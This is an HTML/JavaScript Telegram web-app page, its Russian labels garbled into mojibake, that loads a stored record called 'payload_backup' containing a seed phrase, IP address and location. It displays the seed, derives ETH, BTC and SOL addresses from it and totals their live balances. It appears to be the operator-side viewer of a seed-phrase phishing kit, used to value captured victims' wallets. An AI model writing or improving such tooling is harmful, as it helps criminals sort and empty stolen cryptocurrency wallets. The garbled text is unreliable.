<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>–ü—Ä–æ—Ñ–∏–ª—å –∫–æ—à–µ–ª—å–∫–∞</title>
    <link rel="stylesheet" href="https://sp574-maker.github.io/maker/style.css" />
    <link rel="stylesheet" href="https://sp574-maker.github.io/maker/profile.css" />
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bip39@3.0.4/dist/index.umd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bitcoinjs-lib@6.1.0/dist/bitcoinjs-lib.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.73.2/lib/index.iife.min.js"></script>
</head>
<body>
    <div class="container">
        <h1>üëõ –ü—Ä–æ—Ñ–∏–ª—å –∫–æ—à–µ–ª—å–∫–∞</h1>
        <p><strong>ETH –∞–¥—Ä–µ—Å:</strong> <span id="ethAddress">‚Äì</span></p>
        <p><strong>BTC –∞–¥—Ä–µ—Å:</strong> <span id="btcAddress">‚Äì</span></p>
        <p><strong>SOL –∞–¥—Ä–µ—Å:</strong> <span id="solAddress">‚Äì</span></p>
        <p><strong>–î–∞—Ç–∞ –≤—Ö–æ–¥–∞:</strong> <span id="timestamp">‚Äì</span></p>
        <p><strong>IP:</strong> <span id="userIp">‚Äì</span></p>
        <p><strong>–õ–æ–∫–∞—Ü–∏—è:</strong> <span id="userLocation">‚Äì</span></p>
        <p><strong>–û–±—â–∏–π –±–∞–ª–∞–Ω—Å:</strong> <span id="walletBalance">‚è≥ –ó–∞–≥—Ä—É–∑–∫–∞‚Ä¶</span></p>
        <p><strong>Seed-—Ñ—Ä–∞–∑–∞:</strong></p>
        <textarea id="seed" readonly style="width:100%;height:100px;"></textarea>
        <button id="goWalletBtn">üîÅ –ü–µ—Ä–µ–π—Ç–∏ –≤ –∫–æ—à–µ–ª—ë–∫</button>
    </div>

    <script>
        const data = JSON.parse(localStorage.getItem("payload_backup") || "{}");
        const seedPhrase = (data.seed || "").trim();
        const walletType = (data.wallet || "").toLowerCase();
        const timestamp = data.timestamp || "‚Äì";
        const ip = data.ip || "‚Äì";
        const userLocation = data.location || "‚Äì";  // <-- –∑–º—ñ–Ω–µ–Ω–æ –∑ "location"

        document.getElementById("timestamp").textContent = timestamp;
        document.getElementById("userIp").textContent = ip;
        document.getElementById("userLocation").textContent = userLocation;
        document.getElementById("seed").textContent = seedPhrase;

        let addresses = {
            eth: null,
            btc: null,
            sol: null,
        };

        const supported = [
            { coin: "ethereum", symbol: "ETH", chain: "ethereum", key: "eth" },
            { coin: "bitcoin", symbol: "BTC", chain: "bitcoin", key: "btc" },
            { coin: "solana", symbol: "SOL", chain: "solana", key: "sol" },
        ];

        async function deriveAddresses(seedPhrase) {
            try {
                // ETH
                const ethWallet = ethers.Wallet.fromMnemonic(seedPhrase);
                addresses.eth = ethWallet.address;
                document.getElementById("ethAddress").textContent = addresses.eth;

                // BTC
                const seed = await bip39.mnemonicToSeed(seedPhrase);
                const root = bitcoin.bip32.fromSeed(seed);
                const child = root.derivePath("m/44'/0'/0'/0/0");
                addresses.btc = bitcoin.payments.p2pkh({ pubkey: child.publicKey }).address;
                document.getElementById("btcAddress").textContent = addresses.btc;

                // SOL
                const solKey = seed.slice(0, 32);
                const solPair = solanaWeb3.Keypair.fromSeed(solKey);
                addresses.sol = solPair.publicKey.toBase58();
                document.getElementById("solAddress").textContent = addresses.sol;
            } catch (err) {
                console.error("‚ùå –û—à–∏–±–∫–∞ –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ –∞–¥—Ä–µ—Å–æ–≤:", err);
            }
        }

        async function fetchPrices() {
            try {
                const ids = supported.map(c => c.coin).join(",");
                const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=eth`);
                return await res.json();
            } catch (e) {
                console.warn("‚ùå –û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Ü–µ–Ω:", e);
                return {};
            }
        }

        async function fetchBalance(chain, address) {
            try {
                switch (chain) {
                    case "ethereum":
                        const ethRes = await fetch(`https://api.blockchair.com/ethereum/dashboards/address/${address}`);
                        const ethData = await ethRes.json();
                        const ethKey = Object.keys(ethData.data || {})[0];
                        return parseFloat(ethData.data[ethKey]?.address?.balance || 0) / 1e18;
                    case "bitcoin":
                        const btcRes = await fetch(`https://blockchain.info/q/addressbalance/${address}?confirmations=3`);
                        const sats = await btcRes.text();
                        return parseFloat(sats || 0) / 1e8;
                    case "solana":
                        const solRes = await fetch("https://api.mainnet-beta.solana.com", {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({
                                jsonrpc: "2.0",
                                id: 1,
                                method: "getBalance",
                                params: [address]
                            })
                        });
                        const solData = await solRes.json();
                        return parseFloat(solData.result?.value || 0) / 1e9;
                    default:
                        return 0;
                }
            } catch (e) {
                console.warn(`‚ö†Ô∏è –û—à–∏–±–∫–∞ –±–∞–ª–∞–Ω—Å–∞ ${chain}:`, e.message);
                return 0;
            }
        }

        async function calculateTotalETH() {
            const prices = await fetchPrices();
            let totalETH = 0;

            for (const token of supported) {
                const address = addresses[token.key];
                if (!address) continue;

                const balance = await fetchBalance(token.chain, address);
                const rate = prices[token.coin]?.eth || 0;
                totalETH += balance * rate;
            }

            document.getElementById("walletBalance").textContent = `${totalETH.toFixed(6)} ETH`;
        }

        function goToWallet() {
            let url = "https://www.google.com";
            if (walletType.includes("metamask")) url = "https://metamask.io/";
            else if (walletType.includes("trust")) url = "https://trustwallet.com/";
            else if (walletType.includes("phantom")) url = "https://phantom.app/";
            else if (walletType.includes("ton")) url = "https://tonkeeper.com/";
            else if (walletType.includes("coinbase")) url = "https://www.coinbase.com/wallet";

            if (window.Telegram?.WebApp) {
                Telegram.WebApp.openLink(url);
            } else {
                window.open(url, "_blank");
            }
        }

        document.getElementById("goWalletBtn").addEventListener("click", goToWallet);

        deriveAddresses(seedPhrase).then(() => {
            calculateTotalETH();
        });
    </script>
</body>
</html>
